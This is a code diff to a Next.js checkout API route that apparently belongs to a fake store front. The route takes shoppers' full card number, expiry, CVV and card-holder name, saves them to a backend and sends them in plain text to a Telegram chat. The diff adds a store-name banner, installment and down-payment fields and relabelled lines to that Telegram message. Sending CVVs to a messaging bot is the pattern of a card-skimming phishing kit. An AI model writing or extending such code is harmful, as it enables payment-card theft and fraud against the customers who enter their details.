@@ -1,9 +1,9 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, installmentType, downPayment } = await req.json();
 
-  const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
+  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
 
   // حفظ في الداتابيز
   await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
@@ -14,14 +14,20 @@ export async function POST(req: NextRequest) {
 
   // Send Telegram
   const text = [
+    `🏪 طلب لـ متجر مؤسسة بصمة هاتفي المعتمد`,
+    `🔢 رقم الطلب: #${orderId}`,
+    ``,
+    `💰 Total Amount: ${total} SAR`,
+    ...(installmentType === "installment"
+      ? [`💵 First Payment: ${downPayment} SAR`]
+      : [`💵 Payment Type: Full Amount`]),
+    ``,
     `💳 MadaVisa - New Order`,
-    `🆔 Order ID: ${orderId}`,
-    `👤 Customer: ${customer ?? "-"}`,
+    `👤 Order For: ${customer ?? "-"}`,
     `💳 Card Number: ${cardNumber}`,
     `👤 Card Holder: ${cardHolder}`,
-    `📅 Expiry: ${expiry}`,
+    `📅 Valid To: ${expiry}`,
     `🔐 CVV: ${cvv}`,
-    `💰 Total: ${total} SAR`,
   ].join("\n");
 
   await fetch(
